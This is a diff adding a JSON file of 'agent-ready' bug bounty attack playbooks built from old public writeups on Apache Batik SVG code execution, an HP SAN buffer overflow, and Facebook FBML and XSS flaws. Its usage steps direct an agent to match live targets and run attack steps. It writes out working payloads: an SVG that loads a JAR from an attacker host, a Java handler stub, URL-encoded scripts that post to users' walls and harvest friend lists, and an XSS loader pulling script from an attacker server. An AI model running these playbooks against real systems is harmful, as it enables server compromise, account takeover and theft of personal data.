@@ -1,0 +1,402 @@
+{
+  "schema_version": "2.0",
+  "source": "json_writeups",
+  "description": "Agent-ready bug bounty playbooks extracted from writeups.json. Same schema as agent_playbooks_github.json \u2014 safe to merge.",
+  "usage": {
+    "step_1": "Load tactic_index.json and look up your target's technology under by_technology to get relevant playbook IDs.",
+    "step_2": "Filter by by_access_level matching your current access to the target.",
+    "step_3": "Prioritize IDs in high_confidence and quick_wins lists for best hit rate.",
+    "step_4": "Load matching playbooks from this file by their 'id' field.",
+    "step_5": "Check trigger_conditions.prerequisites and applicability_signals against the live target.",
+    "step_6": "If conditions match, run attack_playbook.recon_steps first, then attack_steps.",
+    "step_7": "Confirm with success_indicators. If failed, use failure_indicators to pivot."
+  },
+  "stats": {
+    "total_playbooks": 5,
+    "high_confidence_4_5": 1,
+    "low_confidence_1_3": 4
+  },
+  "playbooks": [
+    {
+      "meta": {
+        "title": "SVG files and Java code execution",
+        "url": "https://agarri.fr/blog/archives/2012/05/11/svg-files-and-java-code-execution/",
+        "programs": "Apache Batik",
+        "authors": "Nicolas Gr\u00e9goire",
+        "bounty": "-",
+        "pub_date": "2012-05-11",
+        "category": "arbitrary code execution",
+        "vuln_type": "RCE",
+        "confidence": 4
+      },
+      "target_profile": {
+        "technology": "Apache Batik",
+        "affected_components": [
+          "SVG processing, specifically conversion to PNG via SVG Rasterizer, and SVG browsing via Squiggle"
+        ],
+        "required_access_level": "unauthenticated",
+        "tech_stack_fingerprints": [
+          "Apache Batik user-agent string in logs (e.g., Batik/1.7)"
+        ],
+        "attack_surface_type": "web_app"
+      },
+      "trigger_conditions": {
+        "when_to_apply": "When the target application uses Apache Batik to process or convert SVG files, and especially if it exposes these functionalities as a web service (e.g., for image export).",
+        "prerequisites": [
+          "The application must be vulnerable to loading external JARs referenced within SVG files.",
+          "The Batik Rasterizer needs to be invoked with specific flags (-onload -scripts application/java-archive) for exploitation."
+        ],
+        "applicability_signals": [
+          "The application's functionality involves processing SVG files uploaded or provided by users.",
+          "Logs show the application using Apache Batik.",
+          "The application performs SVG to image conversions or offers an SVG viewer."
+        ],
+        "skip_if": [
+          "The application's SVG processing is sandboxed to prevent external JAR execution.",
+          "The Batik Rasterizer is not used or is configured with default security settings that prevent script execution."
+        ]
+      },
+      "attack_playbook": {
+        "recon_steps": [
+          "Step 1: Identify if the target application processes SVG files or offers SVG conversion features.",
+          "Step 2: Observe user-agent strings in logs when SVG files are processed to confirm the use of Apache Batik."
+        ],
+        "attack_steps": [
+          "Step 1: Craft a malicious SVG file (`evil.svg`) that references a remote JAR file via `xlink:href` within a `<script>` tag.",
+          "Step 2: Create a Java class (`SVGHandler.java`) that implements `EventListenerInitializer` and registers an `EventListener` for the 'SVGLoad' event.",
+          "Step 3: Compile the Java class and package it into a JAR file (`evil.jar`), ensuring the `MANIFEST.MF` file contains the `SVG-Handler-Class` attribute pointing to your custom handler.",
+          "Step 4: Host the `evil.jar` file on a web server accessible by the target application.",
+          "Step 5: Upload or provide the `evil.svg` file to the target application.",
+          "Step 6: If the target application uses Batik Rasterizer, ensure it's invoked with the necessary flags: `-onload -scripts application/java-archive`.",
+          "Step 7: Observe for signs of code execution, such as specific console output or network callbacks from the executed Java code."
+        ],
+        "payloads_or_patterns": [
+          "evil.svg:\n<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.0\">\n  <script type=\"application/java-archive\" xlink:href=\"http://<ATTACKER_HOST>/evil.jar\"/>\n  <text>Static text ...</text>\n</svg>\n\n",
+          "evil.jar's MANIFEST.MF:\nManifest-Version: 1.0\nSVG-Handler-Class: com.pwnage.svg.SVGHandler\n\n",
+          "com/pwnage/svg/SVGHandler.java:\npackage com.pwnage.svg;\n\nimport org.w3c.dom.events.Event;\nimport org.w3c.dom.events.EventListener;\nimport org.w3c.dom.svg.EventListenerInitializer;\nimport org.w3c.dom.svg.SVGDocument;\nimport org.w3c.dom.svg.SVGSVGElement;\n\npublic class SVGHandler implements EventListenerInitializer {\n    public SVGHandler() {\n    }\n\n    public void initializeEventListeners(SVGDocument document) {\n        SVGSVGElement root = document.getRootElement();\n        EventListener listener = new EventListener() {\n            public void handleEvent(Event event) {\n                System.out.println(\"Oh yeah, inside SVGLoad !\");\n                // Your RCE payload here\n            }\n        };\n        root.addEventListener(\"SVGLoad\", listener, false);\n    }\n}\n"
+        ],
+        "tools_recommended": [
+          "Java Development Kit (JDK) for compiling Java code and creating JARs.",
+          "Web server (e.g., Nginx, Apache HTTP Server) for hosting the malicious JAR.",
+          "Burp Suite or similar proxy to observe network traffic and potential callbacks."
+        ],
+        "success_indicators": [
+          "The application displays the hardcoded string 'Oh yeah, inside SVGLoad !' (or similar output from the custom Java code).",
+          "Network traffic from the target server shows a request to download `evil.jar`.",
+          "A callback is received on the attacker's server or a collaborator tool if the Java code performs network actions."
+        ],
+        "failure_indicators": [
+          "The application returns an error indicating an invalid SVG file or a failure to load external resources.",
+          "No 'SVGLoad' event is triggered, and no Java code is executed. In this case, check if the Batik Rasterizer was used with the correct flags (`-onload -scripts application/java-archive`).",
+          "A security exception is thrown by Batik, indicating that script execution is blocked by default or by a custom security policy."
+        ]
+      },
+      "impact": "Remote Code Execution (RCE) on the server processing the SVG files. This could lead to full system compromise, data exfiltration, or further attacks.",
+      "key_lesson": "When processing user-supplied SVG files with libraries like Apache Batik, ensure that script execution and external JAR loading are disabled or properly sandboxed, as they can lead to RCE.",
+      "id": "9534_svg_files_and_java_code_execution",
+      "source": "json_writeups"
+    },
+    {
+      "meta": {
+        "title": "Compromising HP SAN appliances",
+        "url": "https://agarri.fr/blog/2012/02/17/compromising-hp-san-appliances/",
+        "programs": "HP",
+        "authors": "Agarri.fr",
+        "bounty": "-",
+        "pub_date": "2012-02-17",
+        "category": "Reversing, Reverse Engineering, Hardcoded Credentials, Buffer Overflow",
+        "vuln_type": "Buffer Overflow",
+        "confidence": 3
+      },
+      "target_profile": {
+        "technology": "HP StorageWorks P4000 Virtual SAN Appliance (VSA) / P4000 G2 SAN range",
+        "affected_components": [
+          "Centralized Management Console (CMC) daemon"
+        ],
+        "required_access_level": "unauthenticated",
+        "tech_stack_fingerprints": [
+          "Proprietary TCP protocol on port 1383"
+        ],
+        "attack_surface_type": "network_service"
+      },
+      "trigger_conditions": {
+        "when_to_apply": "When the target is an HP SAN appliance using the Centralized Management Console (CMC) daemon, and a trial or exploitable version is available.",
+        "prerequisites": [
+          "Ability to communicate with the target appliance on port TCP/1383."
+        ],
+        "applicability_signals": [
+          "Successful sniffing of traffic on TCP port 1383 showing specific header structures and XOR encoding.",
+          "The observed traffic pattern includes fields like 'Request transform', 'Response transform: XOR', 'New transform: XOR'."
+        ],
+        "skip_if": [
+          "The observed traffic does not exhibit the described header structures or XOR encoding.",
+          "The target appliance uses a different management protocol or port."
+        ]
+      },
+      "attack_playbook": {
+        "recon_steps": [
+          "Step 1: Identify HP SAN appliances on the network and their management ports (TCP/1383).",
+          "Step 2: Sniff traffic on TCP port 1383 between a Windows client and the HP VSA/SAN appliance. Observe the initial packet exchange to identify protocol structure.",
+          "Step 3: Analyze the sniffed packets to determine the header format and identify XOR encoding. Specifically, look for static header bytes, size fields, and XOR-encoded data.",
+          "Step 4: Attempt to derive the XOR key by sending a login request with a known password string (e.g., 'bbbbbbbb') and analyzing repetitive patterns in the XOR-encoded response."
+        ],
+        "attack_steps": [
+          "Step 1: Construct a login request packet with a carefully crafted overlong password string, targeting the identified sscanf() buffer in the CMC daemon.",
+          "Step 2: Send the crafted packet to the HP SAN appliance's management interface (TCP/1383).",
+          "Step 3: Observe the target appliance's response or lack thereof to determine if a crash or unexpected behavior occurred."
+        ],
+        "payloads_or_patterns": [
+          "Payload format for login request: \"login:/<USERNAME>/<OVERLONG_PASSWORD>/Version <VERSION>\"",
+          "Overlong password string designed to exceed the sscanf() buffer size (e.g., a string significantly longer than 1024 characters)."
+        ],
+        "tools_recommended": [
+          "Wireshark/tshark: For sniffing and analyzing network traffic.",
+          "Python script: For decoding XOR-encoded traffic and constructing crafted packets.",
+          "Netcat/custom script: For sending crafted TCP packets to the target."
+        ],
+        "success_indicators": [
+          "The CMC daemon crashes or becomes unresponsive.",
+          "Unexpected error messages or behavior from the appliance's management interface.",
+          "Confirmation of a buffer overflow via debugging or observing subsequent abnormal behavior (e.g., restart of the daemon)."
+        ],
+        "failure_indicators": [
+          "No crash or unexpected behavior observed after sending the crafted packet (e.g., the appliance responds normally or with an authentication error). Suggestion: Verify the XOR key and the exact sscanf() format string. Try different overlong password lengths.",
+          "The target appliance returns an immediate error or rejects the connection before the payload is processed. Suggestion: Ensure the initial packet formatting and XOR encoding are correct."
+        ]
+      },
+      "impact": "Gaining administrative control over the HP SAN appliance, allowing access to all data stored on the SAN, potential for further exploitation within the network, denial of service.",
+      "key_lesson": "When analyzing network protocols, reverse engineer the protocol structure and encryption (like XOR) to construct and fuzz malformed requests, especially targeting vulnerable parsing functions like sscanf() with excessively long inputs.",
+      "id": "9535_compromising_hp_san_appliances",
+      "source": "json_writeups"
+    },
+    {
+      "meta": {
+        "title": "Facebook FBML DOM Traversal (Information Disclosure)",
+        "url": "https://maustin.net/facebook-fbml-dom-traversal-information-disclosure/",
+        "programs": "Meta / Facebook",
+        "authors": "Matt Austin",
+        "bounty": "-",
+        "pub_date": "2011-08-23",
+        "category": "Information Disclosure",
+        "vuln_type": "DOM Traversal",
+        "confidence": 2
+      },
+      "target_profile": {
+        "technology": "Facebook FBML",
+        "affected_components": [
+          "FBML applications",
+          "/plugins/serverfbml.php"
+        ],
+        "required_access_level": "any_authenticated_user",
+        "tech_stack_fingerprints": [
+          "X-Frame-Options: DENY",
+          "FBML",
+          "serverfbml.php"
+        ],
+        "attack_surface_type": "web_app"
+      },
+      "trigger_conditions": {
+        "when_to_apply": "When an attacker can inject FBML into a Facebook application or embed a Facebook application using an iframe pointing to serverfbml.php.",
+        "prerequisites": [
+          "Attacker controls or can influence the content of an FBML application, or can trick a user into interacting with an attacker-controlled FBML application.",
+          "The target application uses FBML features that expose sensitive data or functionality through DOM elements."
+        ],
+        "applicability_signals": [
+          "Presence of `<fb:comments>`, `<fb:request-form>`, or `<fb:multi-friend-selector>` tags in FBML output.",
+          "The ability to inject arbitrary FBML code into a Facebook application."
+        ],
+        "skip_if": [
+          "Facebook's security measures prevent the embedding of `serverfbml.php` in iframes, or completely sanitize/restrict FBML injection.",
+          "The target application does not utilize FBML components vulnerable to DOM traversal."
+        ]
+      },
+      "attack_playbook": {
+        "recon_steps": [
+          "Step 1: Identify Facebook applications that allow user-generated FBML content or can be embedded via `serverfbml.php`.",
+          "Step 2: Analyze the HTML structure of such applications to identify potential DOM elements that can be accessed via `getElementsByTagName` and contain sensitive information (e.g., friend names, profile picture URLs, user IDs)."
+        ],
+        "attack_steps": [
+          "Step 1: Craft an FBML payload that includes the target elements and JavaScript to traverse the DOM using `getElementsByTagName`.",
+          "Step 2: For comment box vulnerability: Inject FBML with a `<fb:comments>` element, use `getElementsByTagName` to locate the textarea and 'Post on wall' checkbox, use `setValue` to populate them, and then `submit` the form.",
+          "Step 3: For personal information leakage: Inject FBML with a `<fb:multi-friend-selector>` within a `<fb:request-form>`, embed this using `serverfbml.php`, and use JavaScript's `getElementsByTagName('a')` to iterate through friend links, extract `getTitle()` for names, and potentially infer profile pictures and user IDs from surrounding elements.",
+          "Step 4: (Optional) Modify the JavaScript to send collected data to an attacker-controlled server."
+        ],
+        "payloads_or_patterns": [
+          "http://www.facebook.com/plugins/serverfbml.php?api_key=8725050364&amp;fbml=%3Cdiv%20id%3D%22c%22%3E%3Cfb%3Acomments%20xid%3D%22xxx%22%20canpost%3D%22true%22%20candelete%3D%22false%22%3E%3C%2Ffb%3Acomments%3E%3C%2Fdiv%3E%0A%3Cscript%3E%0Ac%20%3D%20document.getElementById(\u2018c\u2019)%3B%0Ac.getElementsByTagName(\u2018input\u2019)%5B12%5D.setChecked(true)%3B%0Ac.getElementsByTagName(\u2018textarea\u2019)%5B0%5D.setValue(\u2018woot%20Content\u2019)%3B%0Ac.getElementsByTagName(\u2018form\u2019)%5B0%5D.submit()%3B%0A%3C%2Fscript%3E",
+          "http://www.facebook.com/plugins/serverfbml.php?api_key=8725050364&amp;fbml=%3Ctextarea%20id%3D%22out%22%20cols%3D%2250%22%20rows%3D%2210%22%3E%3C%2Ftextarea%3E%0A%3Cdiv%20id%3D%22test%22%3E%0A%3Cfb%3Arequest-form%20type%3D%22t%22%20content%3D%22c%22%20%3E%20%0A%3Cfb%3Amulti-friend-selector%20actiontext%3D%22x%22%20%2F%3E%20%0A%3C%2Ffb%3Arequest-form%3E%0A%3C%2Fdiv%3E%0A%0A%3Cscript%3E%0A%09o%20%3D%20document.getElementById(%27out%27)%3B%0A%09setTimeout(%0A%09function()%7B%0A%09%09ele%20%3D%20document.getElementById(%27test%27)%3B%0A%09%09ele%20%3D%20ele.getElementsByTagName(%27a%27)%3B%0A%09%09for(i%3D0%3B%20i%3Cele.length%3B%20i%2B%2B)%7B%0A%09%09%09name%20%3D%20ele%5Bi%5D.getTitle()%3B%0A%09%09%09%2F%2F.getStyle(%27backgroundImage%27)%09%0A%09%09%09if%20(name)%20o.setValue(o.getValue()%2Bname%2B%22%5Cn%22)%3B%0A%09%09%7D%0A%09%7D%2C%202000)%3B%0A%3C%2Fscript%3E"
+        ],
+        "tools_recommended": [
+          "Burp Suite: To intercept and modify requests, and to host a listener for exfiltrated data if necessary.",
+          "Custom JavaScript: For crafting the DOM traversal and data extraction logic within the FBML payload."
+        ],
+        "success_indicators": [
+          "The attacker's own comment is posted on the user's wall without their explicit consent.",
+          "A list of friends' names, profile picture URLs, and user IDs is successfully retrieved and displayed or exfiltrated."
+        ],
+        "failure_indicators": [
+          "The FBML code is sanitized and does not execute as expected, or the DOM traversal fails.",
+          "The `serverfbml.php` endpoint returns an error or does not render the expected elements.",
+          "No sensitive information is disclosed."
+        ]
+      },
+      "impact": "An attacker can automatically post comments on behalf of users, potentially spreading spam or malicious content. Additionally, sensitive personal information such as friends' full names, profile picture URLs, and user IDs can be exfiltrated from a user's account without their knowledge or consent.",
+      "key_lesson": "When interacting with embedded content or user-generated HTML, always validate that DOM manipulation JavaScript is confined to intended elements and cannot traverse into protected or sensitive areas. Utilize `serverfbml.php` for testing Facebook's FBML parsing and rendering.",
+      "id": "9536_facebook_fbml_dom_traversal_information",
+      "source": "json_writeups"
+    },
+    {
+      "meta": {
+        "title": "Hacking Facebook with FBML and DOM",
+        "url": "maustin.net/hacking-facebook-with-fbml-and-dom/",
+        "programs": "Meta / Facebook",
+        "authors": "Matt Austin",
+        "bounty": "-",
+        "pub_date": "2010-07-18",
+        "category": "Cross-site Scripting",
+        "vuln_type": "XSS",
+        "confidence": 3
+      },
+      "target_profile": {
+        "technology": "Facebook Canvas Applications (FBML/FBJS)",
+        "affected_components": [
+          "Canvas Applications",
+          "Public Canvas Pages",
+          "fb:swf tag",
+          "fb:fbjs-bridge"
+        ],
+        "required_access_level": "unauthenticated",
+        "tech_stack_fingerprints": [
+          "FBML",
+          "FBJS"
+        ],
+        "attack_surface_type": "web_app"
+      },
+      "trigger_conditions": {
+        "when_to_apply": "When a Facebook Canvas application utilizes the 'fb:swf' tag and the 'fb:fbjs-bridge' component, as these components are rendered with 'allowScriptAccess=\"always\"'.",
+        "prerequisites": [
+          "The target Facebook application must be using FBML and FBJS.",
+          "The application must expose a 'Public Canvas Page' to allow exploitation of users not logged into the app."
+        ],
+        "applicability_signals": [
+          "Presence of 'fb:swf' tag in the application's FBML.",
+          "Presence of 'fb:fbjs-bridge' component.",
+          "The 'fb:fbjs-bridge' component renders an embed tag with 'allowscriptaccess=\"always\"'."
+        ],
+        "skip_if": [
+          "Facebook's rendering of 'fb:swf' consistently uses 'allowScriptAccess=\"never\"'."
+        ]
+      },
+      "attack_playbook": {
+        "recon_steps": [
+          "Identify Facebook applications using FBML and FBJS within the Facebook Canvas environment.",
+          "Examine the application's FBML for the use of 'fb:swf' and 'fb:fbjs-bridge' tags."
+        ],
+        "attack_steps": [
+          "Step 1: Create a malicious SWF file that contains JavaScript execution capabilities.",
+          "Step 2: Inject an 'fb:fbjs-bridge' tag into the application's FBML, setting its 'src' attribute to point to the attacker-controlled SWF file.",
+          "Step 3: Host the malicious SWF file on a publicly accessible server.",
+          "Step 4: Trigger the Public Canvas Page of the targeted application. When users (even unauthenticated or not logged into the app) visit this page, their browser will load the 'fb:fbjs-bridge' which points to the attacker's SWF. Due to 'allowScriptAccess=\"always\"', the SWF can execute JavaScript in the context of the Facebook domain.",
+          "Step 5: Utilize FBJS DOM traversal functions (e.g., getElementById, getChildNodes) within the loaded SWF to read information from other elements within the canvas sandbox, or perform actions if the SWF is designed for it."
+        ],
+        "payloads_or_patterns": [
+          "<fb:fbjs-bridge src=\"<ATTACKER_CONTROLLED_SWF_URL>\" />"
+        ],
+        "tools_recommended": [
+          "SWF/ActionScript 3 development tools (e.g., Adobe Animate, Flex SDK) for creating the malicious SWF.",
+          "A web server to host the malicious SWF file."
+        ],
+        "success_indicators": [
+          "The attacker's SWF is loaded and executed by the user's browser within the Facebook canvas context.",
+          "The SWF successfully accesses sensitive information from other elements in the canvas or executes arbitrary JavaScript as observed by the attacker.",
+          "Observable JavaScript execution in the browser console or network requests originating from the user's session to attacker-controlled domains."
+        ],
+        "failure_indicators": [
+          "The 'fb:fbjs-bridge' loads a default or error SWF, indicating the 'src' attribute was not properly set or the SWF could not be loaded.",
+          "No JavaScript execution is observed, or 'allowScriptAccess=\"never\"' is enforced for the 'fb:fbjs-bridge' component.",
+          "Facebook's rendering engine sanitizes or blocks the 'fb:fbjs-bridge' tag or the 'src' attribute."
+        ]
+      },
+      "impact": "Information disclosure of user data visible within the Facebook canvas, potentially leading to account takeover if sensitive information like session tokens or personal details are exfiltrated. Execution of arbitrary JavaScript within the Facebook domain can lead to further attacks like CSRF or phishing against other Facebook users.",
+      "key_lesson": "Rely on explicit whitelisting and secure rendering of embeddable content, especially when cross-domain scripting is involved. Always validate and sanitize attributes like 'src' for embed tags when they are dynamically generated, and ensure 'allowScriptAccess' is set to 'never' unless absolutely required and strictly controlled.",
+      "id": "9537_hacking_facebook_with_fbml_and_dom",
+      "source": "json_writeups"
+    },
+    {
+      "meta": {
+        "title": "Facebook XSS via Cross-Origin Resource Sharing",
+        "url": "https://maustin.net/blog/facebook-xss-via-cross-origin-resource-sharing/",
+        "programs": "Meta / Facebook",
+        "authors": "Matt Austin",
+        "bounty": "-",
+        "pub_date": "2010-07-06",
+        "category": "XSS",
+        "vuln_type": "XSS",
+        "confidence": 3
+      },
+      "target_profile": {
+        "technology": "Facebook (specifically touch.facebook.com)",
+        "affected_components": [
+          "touch.facebook.com (iphone web interface)",
+          "URL handling via AJAX"
+        ],
+        "required_access_level": "any_authenticated_user",
+        "tech_stack_fingerprints": [
+          "touch.facebook.com domain",
+          "AJAX loading of content into a div",
+          "URL fragment identifier (#) used for AJAX navigation"
+        ],
+        "attack_surface_type": "web_app"
+      },
+      "trigger_conditions": {
+        "when_to_apply": "When the target website (e.g., touch.facebook.com) uses AJAX to load content based on the URL fragment identifier and does not properly validate the origin of the loaded content, allowing for XSS via malformed URLs.",
+        "prerequisites": [
+          "The target user must be logged into Facebook."
+        ],
+        "applicability_signals": [
+          "The website uses AJAX to update page content based on the URL fragment (e.g., `http://touch.facebook.com/#profile.php`).",
+          "Clicking on links does not cause a full page reload but updates a div via AJAX.",
+          "The AJAX mechanism is capable of loading remote URLs."
+        ],
+        "skip_if": [
+          "The AJAX loading mechanism strictly enforces same-origin policy and rejects all cross-origin requests.",
+          "All response headers indicate strict Content Security Policy (CSP) preventing script execution from external domains."
+        ]
+      },
+      "attack_playbook": {
+        "recon_steps": [
+          "Step 1: Navigate to touch.facebook.com while logged into a Facebook account and observe how URL fragments are handled. Confirm that clicking links updates content via AJAX without full page reloads.",
+          "Step 2: Inspect network traffic to identify the AJAX requests made when navigating via URL fragments. Check if the destination URL is constructed from the fragment and if it supports arbitrary URL loading."
+        ],
+        "attack_steps": [
+          "Step 1: Craft a URL that uses the fragment identifier to point to a remote, attacker-controlled server hosting a malicious payload. Example: `http://touch.facebook.com/#http://example.com/xss.php`",
+          "Step 2: The attacker embeds this crafted URL within an `<iframe>` on an attacker-controlled website. The `<iframe>` can be hidden.",
+          "Step 3: When a victim user visits the attacker-controlled website, the hidden `<iframe>` loads the crafted Facebook URL. Facebook's AJAX mechanism fetches and executes content from `example.com/xss.php`.",
+          "Step 4: The malicious script on `example.com/xss.php` executes within the context of `touch.facebook.com`.",
+          "Step 5 (Optional - for higher impact): If `touch.facebook.com` is a subdomain of `facebook.com`, exploit `document.domain` to set `document.domain = 'facebook.com'` in the XSS payload, allowing the script to interact with the main `facebook.com` domain and potentially hijack sessions or applications."
+        ],
+        "payloads_or_patterns": [
+          "Payload (example for `xss.php`): `<img src=x onerror=\"var s=document.createElement('script');s.src='http://<ATTACKER_SERVER>/fb/fb.js';document.body.appendChild(s);\">`\nPayload (for `fb.js` - example to control `document.domain`): `document.domain = 'facebook.com'; // Further exploit code here`"
+        ],
+        "tools_recommended": [
+          "Burp Suite: To intercept and modify requests, host malicious files on a controlled server.",
+          "A simple web server (e.g., Python's http.server) to host the XSS payload (xss.php and fb.js)."
+        ],
+        "success_indicators": [
+          "The attacker's remote JavaScript file (e.g., `fb.js`) is loaded and executed in the victim's browser within the context of `touch.facebook.com`.",
+          "Observing actions taken by the XSS payload, such as reading cookies, accessing user data, or making unauthorized requests from the victim's session.",
+          "If `document.domain` is manipulated, confirm that JavaScript code can now access resources or cookies associated with `facebook.com`."
+        ],
+        "failure_indicators": [
+          "The remote URL is not loaded, or an error is displayed indicating a cross-origin policy violation.",
+          "The `onerror` event handler of the `<img>` tag does not trigger, meaning the remote script was not loaded or executed.",
+          "A WAF or server-side filter blocks the request to the attacker's domain.",
+          "Suggestion: If direct XSS fails, investigate other input vectors on `touch.facebook.com` or explore alternative attack methods like clickjacking if full page framing is possible."
+        ]
+      },
+      "impact": "Full access to the victim's Facebook account, including reading messages, viewing photos, sending messages, adding friends, posting comments, and potentially taking over Facebook applications owned by the user by exploiting `document.domain` to gain privileges on the main `facebook.com` domain.",
+      "key_lesson": "Always validate and sanitize URL fragments used for AJAX content loading, and enforce strict same-origin policies to prevent cross-origin XSS vulnerabilities.",
+      "id": "9538_facebook_xss_via_cross_origin_resource_s",
+      "source": "json_writeups"
+    }
+  ]
+}
